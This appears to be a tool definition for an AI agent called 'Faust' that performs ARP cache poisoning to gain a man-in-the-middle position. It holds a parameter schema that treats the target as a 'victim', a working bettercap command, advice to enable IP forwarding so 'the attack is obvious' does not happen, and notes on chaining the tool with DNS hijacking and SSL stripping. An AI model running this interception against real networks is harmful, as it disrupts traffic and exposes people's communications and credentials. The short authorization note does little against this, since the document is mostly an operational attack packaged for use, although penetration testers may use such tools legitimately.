---
name: arp_spoof
description: >
  ARP cache poisoning for man-in-the-middle positioning. Convinces target
  hosts that Faust is the gateway, routing their traffic through it.
  DISRUPTIVE — actively interferes with network traffic.
parameters_schema:
  type: object
  properties:
    interface:
      type: string
      description: Interface on the target network.
      default: eth0
    target_ip:
      type: string
      description: Victim IP to poison. Pre-fill from a prior arp_scan summary (hosts[].ip) when available.
    gateway_ip:
      type: string
      description: Gateway IP to impersonate (typically the real router). Pre-fill from arp_scan summary gateway field when available.
    forward:
      type: boolean
      description: Enable IP forwarding so target retains connectivity. Set false only for deliberate traffic blackhole.
      default: true
    duration_s:
      type: integer
      description: How long to sustain the poison. 0 = until manually stopped.
      default: 0
  required:
    - target_ip
    - gateway_ip
typical_duration_s: 30
sensitivity: disruptive
allowed_tools:
  - arp_spoof
---

# ARP Spoof

Inserts Faust into the traffic path between a target and the gateway using
unsolicited ARP replies. Once positioned, other tools (`pcap_inspect`,
`dns_hijack`, ssl-strip, etc.) can operate on the intercepted flow.

## What it returns

```json
{
  "target_ip": "192.168.1.42",
  "gateway_ip": "192.168.1.1",
  "forward_enabled": true,
  "poisoned_entries": 847,
  "duration_s": 120,
  "bytes_forwarded": 15482930
}
```

## Implementation

`bettercap` (modern, scriptable) or `arpspoof` + `ip_forward`. Preferred:

```
sudo bettercap -iface wlan0 -eval "set arp.spoof.targets 192.168.1.42; arp.spoof on"
```

IP forwarding enables via `/proc/sys/net/ipv4/ip_forward=1` — critical,
else target loses connectivity and the attack is obvious.

## Scope

- Very disruptive to the target's network flow
- Target ARP table anomalies are detectable by modern EDR
- Only with explicit authorization for the network
